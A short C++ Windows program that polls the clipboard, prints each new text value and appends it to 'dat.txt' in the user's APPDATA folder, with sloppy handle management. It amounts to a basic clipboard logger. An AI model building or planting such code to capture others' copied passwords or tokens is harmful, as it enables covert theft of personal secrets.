#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <Windows.h>
#include <time.h>

int main() {
	//setlocale(LC_ALL, "RUS");
	std::string ClipboardText[2];
	//char* ClipboardText[2];
	char last[2] = { 0, 0 };
	std::string AppDataPath = getenv("APPDATA");
	int ClipboardTime = NULL;

	for (;;) {

		//Sleep(500);
		//std::cout << time(NULL) << std::endl;
		if (ClipboardTime < time(NULL)) {
			if (IsClipboardFormatAvailable(CF_TEXT) == true) {
				OpenClipboard(0);
				HANDLE hData = GetClipboardData(CF_TEXT);
				ClipboardText[1] = static_cast<char*>(GlobalLock(hData));
				//GlobalUnlock(hData);

				if (ClipboardText[0] != ClipboardText[1]) {
					ClipboardText[0] = ClipboardText[1];
					std::cout << ClipboardText[1] << std::endl;
					std::fstream LogFile;
					LogFile.open(AppDataPath + "\\dat.txt", std::fstream::app);
					if (LogFile.is_open()) {
						LogFile << ClipboardText[1] << std::endl;
						LogFile.close();
					}
				}
				CloseClipboard();
			}
			ClipboardTime = time(NULL);
		}
	}
	return 0;
}
